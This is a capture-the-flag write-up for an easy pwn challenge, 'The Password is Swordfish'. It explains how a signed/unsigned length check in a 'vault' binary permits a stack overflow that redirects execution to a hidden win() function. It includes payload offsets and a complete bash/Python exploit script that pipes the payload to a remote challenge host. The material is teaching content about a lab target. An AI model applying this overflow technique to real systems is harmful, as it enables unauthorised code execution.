# The Password is Swordfish

> **Category:** Pwn  
> **Difficulty:** Easy  
> **Event:** FluidSec CTF

## Description

The challenge provides a password-protected ZIP file containing a single executable named `vault`. Although the application appears to enforce a maximum password length, the implementation contains a logic flaw that allows an attacker to overflow the stack and redirect execution to a hidden function that prints the flag.

The exploit uses a classic **ret2win** technique by overwriting the saved return address with the address of the internal `win()` function.

---

# Challenge Files

```
public.zip
```

Password:

```
infected
```

Contents:

```
vault
```

---

# Initial Analysis

After extracting the binary, the first step was identifying its protections.

```bash
checksec vault
```

Relevant observations:

- NX enabled
- No PIE
- No Stack Canary in the vulnerable function

Since PIE is disabled, function addresses remain constant, making a ret2win attack possible.

---

# Understanding the Vulnerability

The application asks the user for the password length before reading the password itself.

Internally, the length validation and the read loop do **not** interpret the value the same way.

```
Signed validation

-1 <= 64

✔ Accepted
```

Later, the same value is treated as **unsigned** during the input loop.

```
-1

↓

0xffffffff

↓

4294967295
```

As a result, the program attempts to read far more data than the destination buffer can hold, producing a stack-based buffer overflow.

---

# Finding the Target

While reversing the binary, a hidden function was identified:

```
win()
```

Address:

```
0x401b85
```

Its only purpose is to open `/flag.txt`, read its contents and print them to the screen.

Instead of bypassing authentication, the exploit simply redirects execution to this function.

---

# Payload Construction

One important detail is that the loop counter is stored inside the stack frame.

At offset **76**, the payload overwrites the counter itself.

If arbitrary bytes are written at that position, the loop becomes unstable and the overwrite never reaches the saved return address.

To preserve normal execution, the payload restores the expected counter value.

```
Offset   Content

0-75     "A" * 76
76-79    0x4c000000
80-87    "B" * 8
88-95    win()
```

Complete payload:

```
-1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\x4c\x00\x00\x00
BBBBBBBB
0x401b85
```

---

# Local Verification

The exploit was first executed locally.

```bash
python3 solve.py | ./vault
```

Expected output:

```
Error: could not read flag.
```

This confirms execution successfully reached `win()`. The error only appears because the local environment does not contain `/flag.txt`.

---

# Remote Exploitation

After replacing the target host and port, the same payload was sent to the remote service.

```bash
python3 solve.py | nc HOST PORT
```

Since the remote server contains the real flag file, `win()` prints the flag successfully.

---

# Exploit Script

```bash
#!/usr/bin/env bash
set -euo pipefail

HOST="https://INSTANCE.ctf.ae/"
PORT="PORT"

ZIP_FILE="public.zip"
ZIP_PASS="infected"
BIN_NAME="vault"

echo "[+] FluidSec Vault exploit"

for tool in python3 unzip nc; do
    command -v "$tool" >/dev/null || {
        echo "[-] Missing dependency: $tool"
        exit 1
    }
done

[ -f "$ZIP_FILE" ] && unzip -P "$ZIP_PASS" -o "$ZIP_FILE" >/dev/null

chmod +x "$BIN_NAME"

cat > solve.py <<'PY'
from struct import pack
import sys

p64=lambda x:pack("<Q",x)

win=0x401b85

payload  = b"-1\n"
payload += b"A"*76
payload += b"\x4c\x00\x00\x00"
payload += b"B"*8
payload += p64(win)
payload += b"\n"

sys.stdout.buffer.write(payload)
PY

python3 solve.py | ./vault || true

python3 solve.py | nc "$HOST" "$PORT"
```

---

# Exploitation Flow

```
Extract Binary
        │
        ▼
Analyze Protections
        │
        ▼
Locate win()
        │
        ▼
Identify Integer Signedness Bug
        │
        ▼
Trigger Stack Overflow
        │
        ▼
Preserve Loop Counter
        │
        ▼
Overwrite Return Address
        │
        ▼
Jump to win()
        │
        ▼
Read /flag.txt
```

---

# Skills Demonstrated

- Binary exploitation
- Reverse engineering
- Ghidra analysis
- Integer signedness vulnerability analysis
- Stack buffer overflow
- ret2win exploitation
- Payload construction
- Local exploit validation
- Remote exploitation with Netcat

---

# Lessons Learned

This challenge highlights how inconsistent handling of signed and unsigned integers can completely bypass input validation and lead to memory corruption. It also demonstrates that understanding the exact stack layout is essential when building reliable exploits, especially when local variables such as loop counters are overwritten during the overflow.

---

---
